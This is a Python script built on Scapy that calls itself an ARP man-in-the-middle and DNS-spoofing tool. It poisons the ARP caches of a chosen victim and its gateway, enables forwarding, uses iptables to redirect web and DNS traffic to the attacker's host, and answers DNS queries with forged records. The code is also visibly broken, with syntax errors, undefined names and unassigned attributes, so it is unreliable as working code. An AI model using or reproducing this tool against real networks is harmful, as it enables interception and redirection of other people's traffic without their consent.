#Man in the middle with Scapy and python

import os
import threading 
import sys
from scapy.all import *
import argparse
import pdb


spoofedDomains = {}
gateway_ip = ""
target_ip = ""

class ARPPoison(threading.Thread):
	def __init__(self, srcAddress, dstAddress):
		threading.Thread.__init__(self)
		self.srcAddress
		self.dstAddress

	def run(self):
		try:
			ARPpacket = ARP(pdst=self.dstAddress, psrc=self.srcAddress)
			send(ARPpacket, verbose=False, loop=1)

		except:
			print ("Unexpected error:", sys.exc_info()[0])

def enableForwarding():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")#changing it we can make our computer like a gateway (modificandolo podremos realizar enrutamiento)

def redirectionRules(AddressToRedirect = "192.168.1.169", Interface= "eth0"): #the IP address will be our IP address, this is an example
	#os.system('echo 0 > /proc/sys/net/ipv4/conf/'+Interface+'/send_redirects')
	os.system('iptables --flush')
	os.system('iptables --zero')
	os.system('iptables --delete-chain')
	os.system('iptables -F -t nat')
	os.system('iptables --append FORWARD --in-interface'+Interface+' --jump ACCEPT')
	os.system('iptables --table nat --append POSTROUTING --out-interface'+Interface+'--jump MASQUERADE')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination'+AddressToRedirect+)
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination'+AddressToRedirect+)

	os.system('iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP')
	os.system('iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53-d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP')
	os.system('iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP')
	os.system('iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP')
	os.system('iptables -t nat PREROUTING -i eth0 -p udp --dport 53 -j DNAT --to '+AddressToRedirect+)
	os.system('iptables -t nat PREROUTING -i eth0 -p tcp --dport 53 -j DNAT --to '+AddressToRedirect+)

def cleanRules():
	os.system('iptables --flush')

def disableForwarding():
	os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def ShowOrPoisoning(packet):
	#Filter DNS packets from the gateway, so we are going to use IPtables to filter them.
	print ("Target:"+target_ip)

	if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
		#print packet.getlayer(DNS).qd.qname
		#for domain, ipAddress in soofedDomain.items():
			#if packet.getlayer(DNS).qd.qname == domain:

		try:
			#Extract the different layers of the captured package (Extrae las diferentes capas del paquete capturado)
			requestIP = packet[IP]
			requestUDP = packet[UDP]
			requestDNS = packet[DNS]
			requestDNSQR = packet[DNSQR]

			#Compose each layer of the answer package (Componer cada capa del paquete de respuesta)
			responseIP = IP(src=requestIP.dst, dst=requestIP.src)
			responseUDP = UDP(sport = requestUDP.dport, dport= requestUDP.sport)
			responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata='192.168.1.169')
			responseDNS = DNS(qr=1, id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
			send(answer)

		except:
			print("Unexpected error:"+sys.exc_info()[0])
			print("Exception...")

	else:
		print (packet.summary())

if __name__ =='__main__':
	parser = argparse.ArgumentParser(description = 'ARP-MITM and DNS-Spoofing Tool')
	parser.add_argument('-t','--target',required=True, help= 'VictimIP Address')
	parser.add_argument('-i', '--interface', required=False, default=eth0, help='IFace to use')
	parser.add_argument('-v', '--verbose', required=False, default=False, action='store_true', help='verbose')
	parser.add_argument('-g', '--gateway', required=True, default='195.168.1.1', help='Gateway IP address')
	parser.add_argument('-f', '--filter', required=False, default='udp port 53', help='Capture Filter')
	parser.add_argument('-d', '--domains', required=False, help='File to perfom DNS spoofing')
	parser.add_argument('-r', '--route', required=False, help='Redirect all HTTP/HTTPS trafic to the specified IP address')
	args=parser_parseargs()

	enableForwarding()
	#redirectionRules(args.route, args.interface)
	redirectionRules()
	gateway_ip=args.gateway
	target_ip=args.target
	victim= ARPPoison(gateway_ip, target_ip)
	gateway= ARPPoison(target_ip, gateway_ip)
	victim.setDaemon(True)
	gateway_ip.setDaemon(True)
	victim.start()
	gateway.start()

	sniff(iface= args.interface, filter= args.filter, prn=ShowOrPoisoning) #interface related to eth0
																		   #filter related to "udp port 53"




